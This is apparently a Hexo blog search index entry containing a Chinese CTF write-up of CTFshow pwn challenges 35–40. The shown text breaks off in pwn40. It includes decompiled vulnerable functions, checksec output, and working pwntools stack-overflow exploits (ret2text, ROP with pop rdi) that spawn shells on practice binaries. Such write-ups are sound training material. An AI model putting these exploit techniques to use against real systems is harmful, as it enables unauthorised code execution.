<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn35-90(50,53还需要再看看)</title>
      <link href="/2025/07/5881f3e28f68.html"/>
      <url>/2025/07/5881f3e28f68.html</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：正式开始栈溢出了，先来一个最最最最简单的吧</span><br><span class="line">  用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</span><br><span class="line">  ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">  不是nc连接</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cyclic 105</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">$./pwnme aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : See what the program does!</span><br><span class="line">    * *************************************</span><br><span class="line">Where is flag?</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序开启NX，部分开启RELRO</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048984);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A8C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B1C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BA0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : See what the program does!                              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where is flag?\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;QaQ!FLAG IS NOT HERE! Here is your input : %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开”&#x2F;ctfshow_flag” 文件，读取其中的内容，并根据命令行参数决定打印不同的消息。如果命令行参数个数小于等于 1，则提示用户重试，否则调用 ctfshow 函数处理用户输入的命令行参数，并输出相关消息。</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char dest; 声明一个名为 dest 的字符变量。 return strcpy(&amp;dest, src); 使用 strcpy 函数将 src 字符串复制到 dest 字符数组中，并返回指向 dest 的指针。strcpy函数这个函数是一个典型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B060                 public flag</span><br><span class="line">.bss:0804B060 ; char flag[64]</span><br><span class="line">.bss:0804B060 flag            db 40h dup(?)           ; DATA XREF: sigsegv_handler+1D↑o</span><br><span class="line">.bss:0804B060                                         ; main+66↑o</span><br><span class="line">.bss:0804B060 _bss            ends</span><br><span class="line">.bss:0804B060</span><br></pre></td></tr></table></figure><p>注意到signal(11, (__sighandler_t)sigsegv_handler);函数</p><p>当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p><p>那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cyclic 105</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">$ ./pwn aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : See what the program does!</span><br><span class="line">    * *************************************</span><br><span class="line">Where is flag?</span><br><span class="line"></span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><p>Hint：32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32为程序，关闭了栈保护与PIE</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just very easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单查看能够看到漏洞函数为ctfshow函数，跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先声明了一个名为 buf 的字符数组，大小为14字节它距离ebp的距离为0x12，这里通过read函数</p><p>buf能读入0x32 ，转换为10进制就是50个字节的数据，因此这里很明显就存在栈溢出了，在找到漏洞点</p><p>后，很明显看到左边有一个backdoor函数，跟进查看：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是我们所需的一个后门函数，那么我们直接进行溢出覆盖返回地址再输入后门函数地址即可控</p><p>制程序的执行流程至此，那么我们也就得到了我们所需要的一个shell了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x08048521</span> <span class="comment">#backdoor = elf.sym[&#x27;backdoor&#x27;]</span></span><br><span class="line">payload=cyclic(<span class="number">0x12</span>+<span class="number">4</span>)+p32(backdoor) <span class="comment">#b&#x27;a&#x27;*(0x12+4)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 76</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>.There is a backdoor <span class="keyword">function</span></span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2text&amp;&amp;32bit</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure><h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><p>Hint：64位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line"> $ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>64位程序，关闭了栈保护与PIE</p><p>将程序拖进64位IDA查看main函数跟进漏洞ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上题一样，这里存在溢出点，也同样存在后门函数backdoor：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是与32位不同的是，这里需要考虑到堆栈平衡加上ret返回地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28140)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># system函数地址</span></span><br><span class="line">binsh_addr=<span class="number">0x40065B</span> </span><br><span class="line">pop_rdi=<span class="number">0x4007e3</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 107</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>.There is a backdoor <span class="keyword">function</span></span><br><span class="line">    * *************************************</span><br><span class="line">Just easy ret2text&amp;&amp;64bit</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure><h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><p>Hint：32位的 system(); “&#x2F;bin&#x2F;sh”</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ objdump -d ./pwn | grep system@plt</span><br><span class="line">080483a0 &lt;system@plt&gt;:</span><br><span class="line"> 804854f:e8 4c fe ff ff       call   80483a0 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure><p>32位程序，关闭了栈保护与PIE</p><p>IDA查看漏洞函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，漏洞点还是在这，但是我们需要的东西发生了改变，跟进hint函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有“&#x2F;bin&#x2F;sh”字符串，有system函数打，但是直接把程序的流程劫持到这并不能得到我们想要</p><p>的，我们需要进一步进行构造来进行获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure><p>如上所示，我们构造的payload在先进行溢出后，填上system函数的地址，这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，使用 p32 函数将整数值0转换为4字节的字符串。这个字符串将作为 system 函数的第二个参数，用于提供一个指向空值的指针作为 system 函数的第二个参数。当然在这里使用其他任意4个字符进行覆盖也可以如‘aaaa’,’bbbb’等均可。 p32(bin_sh) : 这部分使用 p32 函数将 bin_sh 的地址转换为一个4字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 &#x2F;bin&#x2F;sh ）的指针。该字符串将作为 system函数的第一个参数。</p><p>到此我们就手动构造出了一个system(“&#x2F;bin&#x2F;sh”)出来了，也就能获得我们所需要的shell了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:08048750 aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: hint+15↑o</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="number">0x08048750</span>  <span class="comment">#&quot;/bin/sh&quot;字符串地址（.rodata段）</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 192</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>,but they don<span class="string">&#x27;t work together</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">Just easy ret2text&amp;&amp;32bit</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure><h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><p>Hint：64位的 system(); “&#x2F;bin&#x2F;sh”</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>是64位程序，关闭了栈保护与PIE</p><p>这几题的漏洞点都几乎一样，唯一不同的就是慢慢的少了参数之类的，重复的内容就不再赘述了，</p><p>讲解关键的</p><figure class="highlight 